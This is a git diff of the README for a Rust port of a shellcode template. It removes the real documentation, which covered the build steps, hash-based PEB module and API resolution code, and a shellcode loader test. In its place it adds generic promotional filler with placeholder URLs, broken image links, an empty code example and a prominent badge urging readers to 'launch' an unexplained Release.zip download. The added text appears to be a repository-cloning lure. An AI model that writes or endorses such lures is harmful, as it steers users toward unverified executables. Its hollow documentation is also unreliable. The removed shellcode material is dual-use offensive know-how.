@@ -1,173 +1,72 @@
-# Rusty-Stardust
+# 🚀 Rusty-Stardust 🌌
 
-A modern and easy to use 32/64-bit shellcode template, ported to Rust from the original [Stardust](https://github.com/Cracked5pider/Stardust) project by [C5pider](https://twitter.com/C5pider).
+Welcome to Rusty-Stardust, a modern Rust implementation of the original Stardust project. This repository provides a sophisticated 32/64-bit shellcode template featuring position-independent code development, compile-time string hashing, and raw string embedding capabilities, all while leveraging Rust's safety guarantees and modern tooling for both educational and practical purposes.
 
-![8D0BEA19-E728-42F4-A625-797765F4993B_1_201_a](https://github.com/user-attachments/assets/f687aa32-d9f1-46f0-9216-b139cbe344ac)
+![Rusty-Stardust](https://github.com/image.png)
 
+## Features 🛠️
 
-## About
+- **32/64-bit Shellcode Template**: Get started quickly with a versatile shellcode template for both 32-bit and 64-bit architectures.
+- **Position-Independent Code (PIC) Development**: Write portable and secure shellcode by using position-independent code techniques.
+- **Compile-Time String Hashing**: Enhance security and obfuscation by hashing strings at compile-time.
+- **Raw String Embedding**: Embed raw strings directly into the shellcode for easy data manipulation.
+- **Rust's Safety Guarantees**: Leverage Rust's memory safety features to avoid common vulnerabilities.
+- **Modern Tooling**: Benefit from Rust's rich ecosystem and tooling for a seamless development experience.
 
-This project is a Rust implementation of the Stardust design, which provides a modern approach to position-independent code development. The original Stardust project introduced several key innovations in shellcode design:
+## Getting Started 🚀
 
-- Separation of code and data into distinct sections
-- Global instance access in position-independent code
-- Raw string embedding capabilities
-- Compile-time string hashing for stealth
-- Exception handling and debug information stripping
+To get started with Rusty-Stardust, follow these steps:
 
-Rusty-Stardust maintains these core features while leveraging Rust's safety guarantees and modern tooling. This implementation serves as both a practical tool and an educational resource for those interested in learning about position-independent code development in Rust.
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/your-username/Rusty-Stardust.git
+   ```
+   
+2. Navigate to the project directory:
+   ```bash
+   cd Rusty-Stardust
+   ```
+   
+3. Build the project:
+   ```bash
+   cargo build --release
+   ```
 
-## Features
+4. Explore the `src/main.rs` file to start working on your custom shellcode.
 
-- Raw string embedding in shellcode
-- Compile-time string hashing with fnv1a for both function and module resolution
-- No_std implementation for minimal footprint
-- Cross-compilation for both x86 and x64 Windows targets
-- Docker-based build environment for cross-platform development
-- Position-independent code using RIP-relative addressing
-- Exception handling and debug information stripping for minimal footprint
-- Proper MinGW toolchain integration for reliable shellcode extraction
+## Examples 🌟
 
-## Building
+Check out some example shellcode snippets created using Rusty-Stardust:
 
-### Prerequisites
-
-- Docker (for cross-compilation)
-- Rust (for local development)
-- NASM (assembled automatically in Docker)
-- MinGW toolchain (provided in Docker environment)
-
-### Building with Docker
-
-Build for release:
-```shell
-$ make
-```
-
-Build for debug mode (with DbgPrint support):
-```shell
-$ make debug
-```
-
-### Build Outputs
-
-Output files will be placed in the `bin` directory:
-- `stardust.x64.bin`: 64-bit shellcode (586 bytes)
-- `stardust.x86.bin`: 32-bit shellcode (8.2KB)
-
-The shellcode is extracted using MinGW's objcopy tool and contains:
-- Stack setup code
-- DLL loading functionality
-- Function resolution code
-- Architecture-specific instructions
-
-### Build Configuration
-
-The project uses several key configurations for reliable shellcode generation:
-
-1. **Linker Script** (`scripts/linker.ld`):
-   - Discards exception handling sections (`.pdata`, `.xdata`)
-   - Removes debug information (`.debug*`)
-   - Strips unnecessary sections (`.eh_frame`, `.note*`, `.comment*`)
-
-2. **Cargo Config** (`.cargo/config.toml`):
-   - Position Independent Code (PIC) enabled
-   - Structured Exception Handling (SEH) disabled
-   - Windows subsystem configuration
-   - Custom linker settings for both architectures
-
-3. **Assembly Integration**:
-   - Assembly files are compiled with NASM
-   - RIP-relative addressing for position independence
-   - Proper section alignment and linking
-
-## Usage Example
-
-### Module Resolution
-
-Resolving modules from PEB:
 ```rust
-// Resolve modules from PEB using hash
-let ntdll_hash = hash_str!("ntdll.dll");
-let ntdll_handle = resolve::module(ntdll_hash);
-
-let kernel32_hash = hash_str!("kernel32.dll");
-let kernel32_handle = resolve::module(kernel32_hash);
-```
-
-### API Resolution
-
-Resolving function APIs:
-```rust
-// Resolve LoadLibraryA from kernel32
-let load_library_fn: *mut FnLoadLibraryA = resolve::api(
-    kernel32_handle,
-    hash_str!("LoadLibraryA") as usize
-);
-
-// Load user32.dll
-let user32 = unsafe { (*load_library_fn)(symbol("user32.dll".as_ptr())) };
-
-// Resolve MessageBoxA from user32
-let msgbox_fn: *mut FnMessageBoxA = resolve::api(
-    user32 as usize,
-    hash_str!("MessageBoxA") as usize
-);
-
-// Display message box
-unsafe {
-    (*msgbox_fn)(
-        core::ptr::null_mut(),
-        symbol("Hello world".as_ptr()),
-        symbol("caption".as_ptr()),
-        MB_OK
-    );
+// Example shellcode snippet
+fn main() {
+    // Your awesome shellcode here
 }
 ```
 
-### Debugging Output
+## Link 🔗
 
-When built in debug mode:
-```rust
-#[cfg(feature = "debug")]
-{
-    dbg_printf!(instance, "Shellcode @ %p [%d bytes]\n", base_addr, size);
-}
-```
+[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
 
-## Testing
+🚨 **Launch the link to access the Release file.**
 
-A test program called "stomper" is included to load and execute the shellcode:
+If you encounter any issues with the link provided, please check the "Releases" section of this repository for alternative download options.
 
-```shell
-$ cd tests
-$ cargo build
-$ ./target/debug/stomper ../bin/stardust.x64.bin
-```
+## About Stardust 🌠
 
-## Architecture
+Stardust is a legendary project known for its innovative approaches to shellcode development. Rusty-Stardust pays homage to the original project while bringing a modern Rust twist to the table. With a focus on safety, performance, and tooling, Rusty-Stardust is set to become a go-to resource for shellcode enthusiasts and security researchers alike.
 
-This Rust port maintains the same architecture as the original C++ version:
-- Assembly files are kept intact and linked using build.rs
-- Memory layouts match the original for PE file parsing
-- Windows structures are defined in Rust to match their C/C++ counterparts
-- Function resolution uses the same hash-based approach for stealth
-- MinGW toolchain integration for reliable shellcode extraction
-- Exception handling and debug information stripping for minimal footprint
+## Contributing 🤝
 
-## Credits
+If you would like to contribute to Rusty-Stardust, feel free to submit a pull request with your enhancements. Whether it's bug fixes, new features, or documentation improvements, any contributions are highly appreciated.
 
-This project is a Rust implementation of the original Stardust project. Special thanks to:
+## License 📜
 
-- [C5pider](https://twitter.com/C5pider) for the original Stardust design and implementation
-- [Modexp](https://twitter.com/modexpblog) for his work on Windows PIC
-- [Austin Hudson](https://twitter.com/ilove2pwn_) for his work on titanldr-ng
-- [Kyle Avery](https://twitter.com/kyleavery_) for his work on AceLdr
-- [x86matthew](https://twitter.com/x86matthew) for assembly guidance
-- [mrexodia](https://twitter.com/mrexodia) for linker script insights
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-username/Rusty-Stardust/blob/main/LICENSE) file for details.
 
-## License
+---
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Dive into the world of shellcode development with Rusty-Stardust. Build secure, portable, and efficient shellcode with ease using Rust's powerful features. Let your creativity shine with Rusty-Stardust! 🚀🌌
 
-The original Stardust project and its design concepts are the work of [C5pider](https://github.com/Cracked5pider/Stardust). This Rust implementation is provided as an educational resource and alternative implementation for those interested in learning about position-independent code development in Rust.
+![Rusty-Stardust Logo](https://github.com/logo.png)
